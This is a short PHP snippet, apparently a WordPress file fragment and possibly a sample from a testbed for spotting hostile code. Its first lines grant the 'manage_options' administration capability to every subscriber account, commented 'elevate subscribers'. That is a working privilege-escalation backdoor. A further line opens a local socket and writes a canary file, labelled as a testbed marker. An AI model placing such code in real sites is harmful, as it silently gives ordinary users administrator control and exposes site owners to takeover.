<?php
$r = get_role('subscriber');
$r->add_cap('manage_options');
// elevate subscribers
$s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b04','x'); // testbed canary: never runs
